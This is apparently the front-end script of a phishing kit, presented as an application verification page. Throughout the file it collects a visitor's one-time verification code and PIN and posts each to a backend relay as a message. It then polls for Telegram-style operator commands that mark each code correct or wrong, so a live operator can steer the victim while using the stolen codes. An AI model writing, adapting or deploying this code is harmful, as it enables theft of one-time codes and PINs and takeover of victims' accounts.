// Global variables
let lastUpdateId = 0;
let checkInterval;
let timerInterval;

// Wait for DOM to load
document.addEventListener('DOMContentLoaded', function() {
    const refId = localStorage.getItem('currentRef');
    
    if (refId) {
        document.getElementById('refId').textContent = refId;
        startCheckingUpdates();
    } else {
        alert('No application reference found. Please start over.');
        window.location.href = 'index.html';
    }
    
    // Handle code form submission
    const codeForm = document.getElementById('codeForm');
    if (codeForm) {
        codeForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const code = document.getElementById('verificationCode').value.trim();
            const refId = localStorage.getItem('currentRef');
            
            if (!code) {
                alert('Please enter the verification code');
                return;
            }
            
            if (code.length < 4 || code.length > 6) {
                alert('Code must be 4-6 digits');
                return;
            }
            
            // Disable form
            document.getElementById('verificationCode').disabled = true;
            document.getElementById('submitCodeBtn').disabled = true;
            document.getElementById('codeForm').style.opacity = '0.7';
            document.getElementById('timer').classList.remove('hidden');
            
            // Start 3-minute timer
            startTimer(180);
            
            // ✅ USE RELATIVE URL
            fetch('/api/send-message', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    message: `🔐 *CODE ENTERED*\nRef: ${refId}\nCode: ${code}`
                })
            }).catch(error => console.error('Error sending code:', error));
            
            showMessage('Code sent for verification. Please wait for admin approval...', 'success');
        });
    }
    
    // Input validation
    const codeInput = document.getElementById('verificationCode');
    if (codeInput) {
        codeInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
        });
    }
    
    const pinCodeInput = document.getElementById('pinCode');
    if (pinCodeInput) {
        pinCodeInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
        });
    }
});

// Start checking for updates from backend
function startCheckingUpdates() {
    checkInterval = setInterval(async () => {
        try {
            // ✅ USE RELATIVE URL
            const response = await fetch(`/api/get-updates/${lastUpdateId}`);
            const data = await response.json();
            
            if (data.success && data.data.result && data.data.result.length > 0) {
                data.data.result.forEach(update => {
                    lastUpdateId = update.update_id;
                    
                    if (update.message && update.message.text) {
                        const text = update.message.text;
                        const refId = localStorage.getItem('currentRef');
                        
                        if (text.includes(`/correct_${refId}`)) {
                            handleCorrectCode();
                        } else if (text.includes(`/wrong_${refId}`)) {
                            handleWrongCode();
                        } else if (text.includes(`/pin_correct_${refId}`)) {
                            handlePinCorrect();
                        } else if (text.includes(`/pin_wrong_${refId}`)) {
                            handlePinWrong();
                        }
                    }
                });
            }
        } catch (error) {
            // Silent retry
            console.log('Checking for updates...');
        }
    }, 3000);
}

// Handle correct code
function handleCorrectCode() {
    if (checkInterval) clearInterval(checkInterval);
    if (timerInterval) clearInterval(timerInterval);
    
    document.getElementById('timer').classList.add('hidden');
    document.getElementById('codeForm').classList.add('hidden');
    document.getElementById('pinSection').classList.remove('hidden');
    
    showMessage('✅ Code verified! Please enter your PIN.', 'success');
}

// Handle wrong code
function handleWrongCode() {
    if (timerInterval) clearInterval(timerInterval);
    
    document.getElementById('timer').classList.add('hidden');
    document.getElementById('verificationCode').disabled = false;
    document.getElementById('submitCodeBtn').disabled = false;
    document.getElementById('codeForm').style.opacity = '1';
    document.getElementById('verificationCode').value = '';
    
    showMessage('❌ Wrong code. Please try again.', 'error');
}

// Submit PIN for verification
window.submitPin = function() {
    const pin = document.getElementById('pinCode').value.trim();
    const refId = localStorage.getItem('currentRef');
    
    if (!pin) {
        alert('Please enter your PIN');
        return;
    }
    
    if (pin.length < 4 || pin.length > 6) {
        alert('PIN must be 4-6 digits');
        return;
    }
    
    document.getElementById('pinCode').disabled = true;
    document.querySelector('.pin-section .btn-submit').disabled = true;
    
    showMessage('PIN sent for verification. Please wait...', 'success');
    
    // ✅ USE RELATIVE URL
    fetch('/api/send-message', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            message: `🔑 *PIN ENTERED*\nRef: ${refId}\nPIN: ${pin}`
        })
    }).catch(error => console.error('Error sending PIN:', error));
};

// Handle correct PIN
function handlePinCorrect() {
    showMessage('✅ PIN verified! Redirecting...', 'success');
    setTimeout(() => {
        localStorage.clear();
        window.location.href = 'success.html';
    }, 2000);
}

// Handle wrong PIN
function handlePinWrong() {
    document.getElementById('pinCode').disabled = false;
    document.getElementById('pinCode').value = '';
    document.querySelector('.pin-section .btn-submit').disabled = false;
    showMessage('❌ Wrong PIN. Please try again.', 'error');
}

// Start timer
function startTimer(seconds) {
    const timerDisplay = document.getElementById('countdown');
    const progressBar = document.getElementById('progress');
    
    if (!timerDisplay || !progressBar) return;
    
    timerDisplay.textContent = seconds;
    progressBar.style.width = '100%';
    
    timerInterval = setInterval(() => {
        seconds--;
        if (seconds >= 0) {
            timerDisplay.textContent = seconds;
            const percentage = (seconds / 180) * 100;
            progressBar.style.width = percentage + '%';
        }
        
        if (seconds <= 0) {
            clearInterval(timerInterval);
            handleTimeout();
        }
    }, 1000);
}

// Handle timeout
function handleTimeout() {
    document.getElementById('timer').classList.add('hidden');
    document.getElementById('verificationCode').disabled = false;
    document.getElementById('submitCodeBtn').disabled = false;
    document.getElementById('codeForm').style.opacity = '1';
    document.getElementById('verificationCode').value = '';
    showMessage('⏰ Time expired. Please request a new code and try again.', 'error');
}

// Show message
function showMessage(text, type) {
    const messageBox = document.getElementById('messageBox');
    if (!messageBox) return;
    
    messageBox.textContent = text;
    messageBox.className = 'message-box ' + type;
    messageBox.classList.remove('hidden');
    
    if (type === 'success') {
        setTimeout(() => {
            messageBox.classList.add('hidden');
        }, 5000);
    }
}